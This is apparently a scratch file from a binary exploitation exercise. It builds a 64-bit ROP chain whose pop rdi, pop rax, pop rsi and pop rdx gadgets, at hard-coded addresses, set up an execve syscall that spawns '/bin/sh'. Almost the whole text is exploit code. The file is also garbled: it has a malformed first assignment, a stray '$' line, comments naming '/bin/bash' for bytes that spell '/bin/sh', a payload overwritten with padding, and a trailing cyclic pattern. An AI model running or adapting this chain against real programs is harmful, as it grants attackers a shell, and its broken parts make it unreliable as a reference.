payload = SHELL_FILE = p64(0x68732f6e69622f)              # Set execve() filename: /bin/bash/


payload += BUFF_FILL            

#   MOV_RDI_RSI:    Pointer to 'mov rdi, rsi' gadget to copy '/bin/sh' from RSI to RDI for execve() file parameter
#

# if i enter at "enter small or large", it wil put in rdi itself
#  0x401f2f <run+64>         mov    rdi, rax



payload += POP_RDI              #POP_RDI = p64(0x004018e2)              ## Set Gadget 1: pop rdi; ret
payload += SHELL_FILE           #SHELL_FILE = p64(0x68732f6e69622f)     ## Set execve() filename: /bin/bash/  

#
#   POP_RAX:        Pointer to 'pop rax; ret' gadget to load '59' (SYS_EXECVE) into RAX register for syscall
#   SYS_EXECVE:     Contains syscall number (59) for the sys_execve syscall (64-bit)
$
payload += POP_RAX              #POP_RAX = p64(0x0045a137)      ## Set Gadget 2: pop rax; ret
payload += SYS_EXECVE           #SYS_EXECVE = p64(59)           ## Set Sys Call 1: execve (59)    

#
#   POP_RSI:        Pointer to 'pop rsi; ret' gadget to load '0' into RSI register for execve() argv
#   EXECVE_ARGV:    Null Value (0) for use as argv parameter in sys_execve()
#
payload += POP_RSI              #POP_RSI = p64(0x40f46e)        ## Set Gadget 3: pop rsi; ret
payload += EXECVE_ARGV          #EXECVE_ARGV = p64(0)		    ## Set execve() argv: null (0)

#
#   POP_RDX:        Pointer to 'pop rdx; ret' gadget to load '0' into RDX register for execve() envp
#   EXECVE_ENVP:    Null Value (0) for use as envp parameter in sys_execve()
#
payload += POP_RDX              #POP_RDX = p64(0x4017ef)        ## Set Gadget 4: pop rdx; ret 
payload += EXECVE_ENVP          #EXECVE_ENVP = p64(0)		    ## Set execve() envp: null (0)


#
#   SYS_CALL:       Pointer to 'syscall' to execute sys_execve()
#
payload += SYS_CALL             #SYS_CALL = p64(0x4012e3)       ## Set Sys Call address






payload = A*58
payload += 0x68732f6e69622f

HHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPP

login+53